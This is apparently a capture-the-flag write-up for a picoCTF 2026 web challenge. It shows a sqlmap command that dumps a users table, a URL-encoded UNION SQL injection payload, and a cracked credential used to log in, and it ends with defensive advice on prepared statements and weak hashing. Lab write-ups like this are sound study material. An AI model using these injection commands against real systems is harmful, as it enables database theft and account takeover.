---
layout: post
title: "Sql Map1"
date: 2026-03-20
categories: [picoctf2026, web]
ctf: picoctf2026
difficulty: Medium
points: 300
author: "matcha / Ding Jie"
description: "Using sqlmap to dump credentials from a vulnerable endpoint, then logging in with cracked credentials."
---

## Challenge

**Category:** Web · **Points:** 300 · **CTF:** picoCTF 2026

---

## Analysis

The target URL has a parameter vulnerable to SQL injection. Running sqlmap confirms the vulnerability and dumps the `users` table.

---

## Approach

**Step 1 — Run sqlmap**

```bash
sqlmap -u "http://lonely-island.picoctf.net:55358/vuln.php?q=1" \
  --dump -T users --batch
```

This returns usernames and hashed passwords for `admin` and `ctf-player`.

**Step 2 — Inspect the results manually**

The UNION-based payload also works directly:

```
http://lonely-island.picoctf.net:55358/vuln.php?q=%27%20UNION%20SELECT%20username,password%20FROM%20users--+
```

This reveals a few suspicious hashes.

**Step 3 — Crack the hash**

The `ctf-player` account's hash cracks to `dyesebel`. Log in with those credentials to retrieve the flag.

---

## Key Takeaway

Never trust user-supplied input in SQL queries. Use parameterised queries / prepared statements. Even "hashed" passwords are useless if the hash is weak or unsalted.

---

## Flag

```
picoCTF{placeholder_sql_map1}
```
